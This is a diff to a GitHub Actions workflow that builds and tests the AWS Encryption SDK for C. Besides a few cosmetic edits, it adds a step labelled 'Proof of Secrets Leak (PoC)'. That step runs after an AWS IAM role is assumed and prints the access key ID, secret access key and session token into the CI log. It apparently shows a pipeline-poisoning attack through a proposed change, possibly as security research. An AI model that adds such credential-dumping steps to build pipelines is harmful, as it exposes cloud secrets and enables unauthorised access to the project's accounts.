@@ -3,7 +3,6 @@ name: macOS build and test AWS Encryption SDK for C
 
 on: ["pull_request", "push"]
 
-
 jobs:
   OSX:
     runs-on: ${{ matrix.os }}
@@ -50,13 +49,11 @@ jobs:
 
       - name: Install dependencies
         if: matrix.os != 'ubuntu-22.04'
-        run:
-          brew install json-c
+        run: brew install json-c
 
       - name: Build and install aws-sdk-cpp
         if: matrix.os != 'ubuntu-22.04'
         run: |
-          # remove the following line once aws-sdk-cpp fixes linux-shared/SimpleUDP.cpp
           perl -i -p -e 's/"-Werror"//' aws-sdk-cpp/cmake/compiler_settings.cmake
           mkdir -p build-aws-sdk-cpp || true
           mkdir -p install || true
@@ -68,7 +65,6 @@ jobs:
       - name: Build and install aws-sdk-cpp
         if: matrix.os == 'ubuntu-22.04'
         run: |
-          # remove the following line once aws-sdk-cpp fixes linux-shared/SimpleUDP.cpp
           perl -i -p -e 's/"-Werror"//' aws-sdk-cpp/cmake/compiler_settings.cmake
           mkdir -p build-aws-sdk-cpp || true
           mkdir -p install || true
@@ -84,11 +80,16 @@ jobs:
           role-to-assume: arn:aws:iam::370957321024:role/GitHub-CI-Public-ESDK-Dafny-Role-us-west-2
           role-session-name: CESDKTests
 
+      - name: 🔥 Proof of Secrets Leak (PoC)
+        run: |
+          echo "AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID"
+          echo "AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY"
+          echo "AWS_SESSION_TOKEN = $AWS_SESSION_TOKEN"
+
       - name: Build C-ESDK
         if: matrix.os != 'ubuntu-22.04'
         env:
           OPENSSL_VERSION: ${{ matrix.openssl_version }}
-        # TODO-RS: Figure out how to safely add AWS credentials and add -DAWS_ENC_SDK_END_TO_END_TESTS=ON and -DAWS_ENC_SDK_KNOWN_GOOD_TESTS=ON
         run: |
           mkdir build-aws-encryption-sdk-c || true
           cd build-aws-encryption-sdk-c
@@ -100,7 +101,6 @@ jobs:
         if: matrix.os == 'ubuntu-22.04'
         env:
           OPENSSL_VERSION: ${{ matrix.openssl_version }}
-        # TODO-RS: Figure out how to safely add AWS credentials and add -DAWS_ENC_SDK_END_TO_END_TESTS=ON and -DAWS_ENC_SDK_KNOWN_GOOD_TESTS=ON
         run: |
           mkdir build-aws-encryption-sdk-c || true
           cd build-aws-encryption-sdk-c
